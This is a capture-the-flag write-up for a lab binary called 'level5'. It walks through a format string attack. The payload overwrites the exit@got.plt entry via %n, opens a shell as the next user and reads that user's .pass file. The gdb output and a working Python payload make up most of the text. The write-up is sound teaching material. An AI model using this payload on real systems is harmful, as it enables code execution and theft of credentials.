# Level 5

## Initial Context

- One file: `level5`

## Solving the Challenge

Its the same challenge as `level4`, but we need to override value in the Global Offsets Table instead.

The program calls `printf` then directly `exit`, but by looking at the assembly, we can see that the `exit(n)` call is not direct.

```bash
$ gdb level5
...
(gdb) disass n
Dump of assembler code for function n:
...
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

The `@plt` (or **P**rocedure **L**inkage **T**able) at the end mean that the function is yet to be linked.
The resolved value is gonna be stored in its equivalent `@got.plt` (or **G**lobal **O**ffsets **T**able).

And the value for `exit` is:
```bash
(gdb) disass 'exit@plt'
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
#                               ^ read at memory
...
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
#          ^ bingo              ^ 'real' exit(n) address
...
```

If we try to find `exit@got.plt`'s value using `printf`, we can find it at the 4th position:

```bash
$ python -c 'print "\x38\x98\x04\x08" + "%p " * 5' | ./level5
?? 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049838 0x25207025
#                              ^ bingo
```

By using the same method as the previous levels, we need to override `exit@got.plt`'s value to `o`'s, which is `0x080484a4` (or `134513828`):

```python
# address
"\x38\x98\x04\x08"

# padding to produce 134513828 characters
+ "%134513824x"

# write using %n, at the forth argument using $4
+ "%4$n"
```

Let's save it in a file and send it to the vulnerable program:

```bash
$ python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"' > /tmp/exploit5
$ cat /tmp/exploit5 - | ./level5
whoami
level6
cat /home/user/level6/.pass
<flag>
```

## Inspirations

- https://reverseengineering.stackexchange.com/a/1993
